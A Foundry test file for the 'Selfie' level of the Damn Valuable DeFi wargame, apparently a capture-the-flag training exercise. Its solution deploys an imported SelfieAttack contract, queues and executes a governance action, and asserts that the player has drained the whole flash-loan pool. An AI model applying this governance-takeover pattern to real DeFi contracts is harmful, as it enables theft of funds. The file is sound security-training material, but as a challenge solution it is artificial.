// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {SelfiePool} from "src/selfie/SelfiePool.sol";
import {SimpleGovernance} from "src/selfie/SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "src/DamnValuableTokenSnapshot.sol";
import {SelfieAttack} from "src/player-contracts/SelfieAttack.sol";

contract SelfieTest is Test {
    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000 ether;
    uint256 constant TOKENS_IN_POOL = 1_500_000 ether;

    address deployer = makeAddr("DEPLOYER");
    address player = makeAddr("PLAYER");

    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool pool;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        vm.startPrank(deployer);

        // Deploy Damn Valuable Token Snapshot
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(address(token));

        // Deploy the pool
        pool = new SelfiePool(address(token), address(governance));

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);
        token.snapshot();

        vm.stopPrank();
    }

    function test_SetUpState() public {
        assertEq(governance.getActionCounter(), 1);

        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    function test_Exploit() public {
        /**
         * SOLUTION
         */
        vm.startPrank(player);

        SelfieAttack attackContract = new SelfieAttack(address(pool));
        attackContract.proposeAction();

        skip(2 days);

        attackContract.executeAction();

        vm.stopPrank();

        /**
         * SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE
         */

        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(player), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
